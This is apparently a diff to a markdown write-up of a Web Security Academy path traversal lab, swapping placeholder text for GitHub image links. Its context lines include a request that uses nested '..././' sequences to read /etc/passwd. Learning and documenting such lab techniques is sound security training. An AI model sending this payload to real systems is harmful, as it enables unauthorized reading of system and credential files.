@@ -18,12 +18,15 @@ Lab URL generated: https://0a2a0030049b8f43822a9e64007d00ba.web-security-academy
 
 Browsing the home page or an individual post sends GET requests like this:
 
-pic 1
+<img width="664" height="258" alt="1" src="https://github.com/user-attachments/assets/9288e3d0-3fa6-450b-a98c-4010d9c3ea4b" />
 
-pic 2
+
+<img width="750" height="169" alt="2" src="https://github.com/user-attachments/assets/c5ccd0ce-f5e9-471f-9e5a-28a626ed355c" />
+
 
 ```
 GET /image?filename=..././..././..././..././..././etc/passwd HTTP/2
 ```
 
-pic 3
+<img width="1756" height="755" alt="3" src="https://github.com/user-attachments/assets/a35b2c7a-6dd0-455f-a34d-da88bdbe0d07" />
+
